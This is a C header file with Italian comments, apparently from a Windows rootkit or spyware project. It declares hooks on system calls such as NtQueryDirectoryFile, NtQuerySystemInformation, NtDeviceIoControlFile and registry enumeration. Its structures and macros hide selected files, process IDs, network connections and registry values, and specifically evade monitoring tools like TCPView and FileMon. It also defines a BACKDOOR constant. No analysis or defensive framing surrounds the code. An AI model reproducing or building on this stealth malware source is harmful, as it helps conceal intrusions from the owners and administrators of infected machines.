#include <stdio.h>
#include <stdlib.h>
#include <Winsock.h>
#include "HM_HooksSystemStruct.h"

#define HDUMMY 0xabadc0de
#define BACKDOOR 0xabadc0de

// XXX Fare le inizializzazioni delle variabili locali sempre dopo la MARK_HOOK (vedi anche MARK_SEARCH_LIMIT)

//
// definizione delle funzioni richiamate dai wrappers
//
typedef BOOL  (WINAPI *FreeLibrary_t) (HMODULE);
typedef FARPROC (WINAPI *GetProcAddress_t) (HMODULE, LPCSTR);
typedef HINSTANCE (WINAPI *LoadLibrary_t) (LPCTSTR);
typedef int (WINAPI *GetDeviceCaps_t) (HDC, int);
typedef HGDIOBJ (WINAPI *SelectObject_t) (HDC, HGDIOBJ);
typedef HDC (WINAPI *CreateCompatibleDC_t) (HDC);
typedef HBITMAP (WINAPI *CreateCompatibleBitmap_t) (HDC, int, int);
typedef BOOL  (WINAPI *BitBlt_t) (HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL  (WINAPI *StretchBlt_t) (HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
typedef BOOL (WINAPI *DeleteObject_t) (HGDIOBJ);
typedef BOOL (WINAPI *FillRect_t) (HDC, RECT *, HBRUSH);
typedef HBRUSH (WINAPI *CreateBrushIndirect_t) (LOGBRUSH *);
typedef NTSTATUS (WINAPI *NtEnumerateValueKey_t) (HANDLE, ULONG, DWORD, KEY_VALUE_BASIC_INFORMATION *, ULONG, PULONG);



///////////////////////////
//
//	CreateProcess
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char szDLLName[_MAX_PATH];
	char szHookThreadName[256];
	ResumeThread_T pResumeThread;
} NTCreateProcessRWStruct, *PNTCreateProcessRWStruct;

extern NTCreateProcessRWStruct NTCreateProcessRWData;

DWORD __stdcall NtCreateProcessHook(DWORD ARG1,
	DWORD ARG2,
	DWORD ARG3,
	DWORD ARG4,
	DWORD ARG5,
	DWORD ARG6,
	DWORD ARG7,
	DWORD ARG8,
	DWORD ARG9,
	DWORD ARG10);

DWORD NtCreateProcessHook_setup(HMServiceStruct* pData);

///////////////////////////
//
//	CreateProcessAsUser
//
///////////////////////////

DWORD __stdcall NtCreateProcessAsUserHook(DWORD ARG1,
	DWORD ARG2,
	DWORD ARG3,
	DWORD ARG4,
	DWORD ARG5,
	DWORD ARG6,
	DWORD ARG7,
	DWORD ARG8,
	DWORD ARG9,
	DWORD ARG10,
	DWORD ARG11);

//////////////////////////
//
// NtQueryDirectoryFile
//
//////////////////////////
#define HIDE_NAME_COUNT 3
typedef struct {
	COMMONDATA;
	char name_to_hide[HIDE_NAME_COUNT][MAX_RAND_NAME];
	memcpy_t pMemcpy;
} NtQueryDirectoryFileStruct;

extern NtQueryDirectoryFileStruct NtQueryDirectoryFileData;

DWORD __stdcall  NtQueryDirectoryFileHook(DWORD ARG1,
	DWORD ARG2,
	DWORD ARG3,
	DWORD ARG4,
	DWORD ARG5,
	char* FileInformation,
	ULONG FileInformationLength,
	DWORD FileInformationClass,
	DWORD ARG9,
	DWORD ARG10,
	DWORD ARG11);
DWORD NtQueryDirectoryFileHook_setup(HMServiceStruct* pData);

///////////////////////////
//
// NTQuerySystemInformation
//
///////////////////////////

typedef struct {
	COMMONDATA;
} NTQuerySystemInformationStruct;

extern NTQuerySystemInformationStruct NTQuerySystemInformationData;

#define IF_PID_NOT_PRESENT(x,y) BOOL pid_present = FALSE; \
	                            PID_HIDE *p_phs = y; \
	                            if (p_phs) while (IS_SET_PID_HIDE_STRUCT((*p_phs))) { \
									if (p_phs->PID == x) { \
										pid_present = TRUE; \
										break; \
									} \
									p_phs++; \
								} if (!pid_present)

DWORD WINAPI NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS pSystemInformationClass,
	PVOID	pSystemInformation,
	LONG	SystemInformationLength,
	PULONG ReturnLength);

DWORD NtQuerySystemInformationHook_setup(HMServiceStruct* pData);

///////////////////////////
//
// NtDeviceIoControlFile
//
///////////////////////////
#define EOFFSET(X,Y) ((int) X - (int) Y) 				
#define NEXTSTR(X) while( *X != 0 && *X != 9 ) X++;
#define GETPIDSTR(X) while( *X != ':' && *X != 0 && *X != 9 ) X++;
#define COLDLOOP(X) for(;X>0; X--) 
//
// PATCH per win2k :
// se p_chs->ip_address == [IP da nascondere] allora memorizzo la sua localport
// se scandendo le successive entry nella lista trovo la stessa localport con 0.0.0.0
// tolgo pure questa...
#define IF_CON_NOT_PRESENT(x,y) BOOL con_present = FALSE; \
		                        CONNECTION_HIDE *p_chs = y; \
	                            if (p_chs) while (IS_SET_CONNETCION_HIDE_STRUCT((*p_chs))) { \
									if ( (p_chs->ip_address == x->dwRemoteAddr) || (x->dwLocalAddr == 0 && x->dwLocalPort == pData->dwLocalPort && pData->dwLocalPort) ) { \
										con_present = TRUE;  \
										break; \
									} \
									p_chs++; \
								} if (!con_present)
// Patch per Win2K
// Per ricerca localport di Internet Explorer
//
#define IF_CON_PRESENT(x,y) BOOL con_presentTmp = FALSE; \
		                        CONNECTION_HIDE *p_chsTmp = y; \
	                            if (p_chsTmp) while ( IS_SET_CONNETCION_HIDE_STRUCT((*p_chsTmp)) ) { \
									if ( (p_chsTmp->ip_address == x->dwRemoteAddr) && (p_chsTmp->port == x->dwRemotePort) ) { \
										con_presentTmp = TRUE;  \
										break; \
									} \
									p_chsTmp++; \
								} if (con_presentTmp)
typedef struct {
	DWORD dwCnt;
	DWORD dwData1;
	DWORD dwData2;
	DWORD dwTime;
	DWORD dwMillisec;
	char szInfo[4];
} FileMonDevStruct;

typedef struct {
	COMMONDATA;
	atoi_t pAtoi;
	memcpy_t pMemcpy;
	DWORD dwLocalPort;
} NTDeviceIOControlFileStruct;

extern NTDeviceIOControlFileStruct NTDeviceIOControlFileData;

#define TCPVIEW_DEV 1
#define FILEMON_DEV 2
#define VISTA_NSI 3
#define TCP_STD 1
#define TCP_EXT 2
#define TCP_SUP 3

DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
	DWORD ARG2,
	DWORD ARG3,
	DWORD ARG4,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG IoControlCode,
	char* InputBuffer,
	ULONG InputBufferLength,
	PVOID OutputBuffer,
	ULONG OutputBufferLength);

DWORD NtDeviceIoControlFileHook_setup(HMServiceStruct* pData);

///////////////////////////
//
// NtEnumerateValueKey
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char name_to_hide[MAX_RAND_NAME];
} NtEnumerateValueKeyStruct;

extern NtEnumerateValueKeyStruct NtEnumerateValueKeyData;

DWORD __stdcall NtEnumerateValueKeyHook(DWORD ARG1,
	DWORD RIndex,
	DWORD InformationClass,
	DWORD* KeyValueInformation,
	DWORD InformationLen,
	DWORD* ResultLen);

DWORD NtEnumerateValueKeyHook_setup(HMServiceStruct* pData);

///////////////////////////
//
//   NtQueryKey
//
///////////////////////////

typedef struct {
	COMMONDATA;
	char name_to_hide[MAX_RAND_NAME];
	NtEnumerateValueKey_t pNtEnumerateValueKey;
} NtQueryKeyStruct;

extern NtQueryKeyStruct NtQueryKeyData;

DWORD __stdcall NtQueryKeyHook(DWORD ARG1,
	DWORD InformationClass,
	KEY_FULL_INFORMATION* KeyInformation,
	DWORD InformationLen,
	DWORD* ResultLen);

DWORD NtQueryKeyHook_setup(HMServiceStruct* pData);

//////////////////////////
//
// ReadDirectoryChangesW
//
//////////////////////////

typedef struct {
	COMMONDATA;
} ReadDirectoryChangesWStruct;

extern ReadDirectoryChangesWStruct ReadDirectoryChangesWData;

BOOL WINAPI ReadDirectoryChangesWHook(HANDLE hDirectory,
	LPVOID lpBuffer,
	DWORD nBufferLength,
	BOOL bWatchSubtree,
	DWORD dwNotifyFilter,
	LPDWORD lpBytesReturned,
	LPOVERLAPPED lpOverlapped,
	LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);

DWORD ReadDirectoryChangesWHook_setup(HMServiceStruct* pData);

/*
///////////////////////////
//
// OpenProcess
//
///////////////////////////

typedef struct {
	COMMONDATA;
} OpenProcessStruct;

OpenProcessStruct OpenProcessData;

HANDLE WINAPI OpenProcessHook(DWORD ARG1,
									 BOOL  ARG2,
									 DWORD op_pid);

DWORD OpenProcessHook_setup(HMServiceStruct *pData);
*/